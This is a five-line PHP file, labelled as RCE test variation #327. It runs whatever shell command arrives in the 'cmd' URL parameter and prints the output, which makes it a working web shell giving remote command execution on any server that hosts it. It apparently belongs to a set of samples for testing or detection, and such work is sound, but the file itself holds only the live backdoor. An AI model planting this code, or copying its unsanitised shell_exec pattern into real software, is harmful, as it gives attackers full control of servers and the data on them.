<?php
// RCE test variation #327
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>